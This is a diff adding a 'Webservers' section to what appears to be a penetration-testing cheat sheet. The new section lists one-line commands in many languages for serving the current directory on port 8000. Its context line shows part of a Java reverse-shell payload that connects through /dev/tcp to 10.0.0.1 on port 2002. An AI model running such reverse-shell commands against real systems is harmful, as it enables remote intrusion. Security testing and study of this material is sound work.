@@ -484,8 +484,125 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
+### [](#header-3)Webservers
 
+Python2
 
+```
+python -m SimpleHTTPServer 8000
+```
+
+Python3
+
+```
+python -m http.server 8000
+```
+
+Twisted(Python)
+
+```
+twistd -n web -p 8000 --path .
+```
+
+```
+python -c 'from twisted.web.server import Site; from twisted.web.static import File; from twisted.internet import reactor; reactor.listenTCP(8000, Site(File("."))); reactor.run()'
+```
+
+Ruby
+
+```
+ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'
+```
+
+Ruby > 1.9.2
+
+```
+ruby -run -ehttpd . -p8000
+```
+
+adsf
+
+```
+gem install adsf   # install dependency
+```
+
+```
+adsf -p 8000
+```
+
+Sinatra(Ruby)
+
+```
+gem install sinatra   # install dependency
+```
+
+```
+ruby -rsinatra -e'set :public_folder, "."; set :port, 8000'
+```
+
+Perl
+
+```
+cpan HTTP::Server::Brick   # install dependency
+```
+
+```
+perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>8000); $s->mount("/"=>{path=>"."}); $s->start'
+```
+
+Plack(Perl)
+
+```
+cpan Plack   # install dependency
+```
+
+```
+plackup -MPlack::App::Directory -e 'Plack::App::Directory->new(root=>".");' -p 8000
+```
+
+Mojolicious(Perl)
+
+```
+cpan Mojolicious::Lite   # install dependency
+```
+
+```
+perl -MMojolicious::Lite -MCwd -e 'app->static->paths->[0]=getcwd; app->start' daemon -l http://*:8000
+```
+
+node-static(Node.js)
+
+```
+npm install -g node-static   # install dependency
+```
+
+```
+static -p 8000
+```
+
+PHP
+
+```
+php -S 127.0.0.1:8000
+```
+
+Erlang
+
+```
+erl -s inets -eval 'inets:start(httpd,[{server_name,"NAME"},{document_root, "."},{server_root, "."},{port, 8000},{mime_types,[{"html","text/html"},{"htm","text/html"},{"js","text/javascript"},{"css","text/css"},{"gif","image/gif"},{"jpg","image/jpeg"},{"jpeg","image/jpeg"},{"png","image/png"}]}]).'
+```
+
+webgf
+
+```
+webfsd -F -p 8000
+```
+
+IIS Express
+
+```
+C:\> "C:\Program Files (x86)\IIS Express\iisexpress.exe" /path:C:\MyWeb /port:8000
+```
 
 ### [](#header-3)Misc
 
